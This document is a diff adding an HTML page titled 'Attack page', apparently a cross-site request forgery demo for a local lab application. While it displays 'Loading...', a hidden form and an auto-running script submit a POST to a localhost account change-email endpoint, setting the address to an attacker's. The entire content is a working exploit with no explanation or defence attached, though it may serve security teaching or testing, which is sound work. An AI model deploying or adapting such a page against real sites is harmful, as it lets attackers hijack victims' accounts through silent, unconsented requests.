@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Attack page</title>
+</head>
+
+<body>
+
+<h1>Loading...</h1>
+
+<form
+        id="csrfForm"
+        action="http://localhost:8080/account/change-email"
+        method="POST">
+
+    <input
+            type="hidden"
+            name="email"
+            value="hacker@example.com">
+
+</form>
+
+<script>
+    document
+        .getElementById("csrfForm")
+        .submit();
+</script>
+
+</body>
+</html>
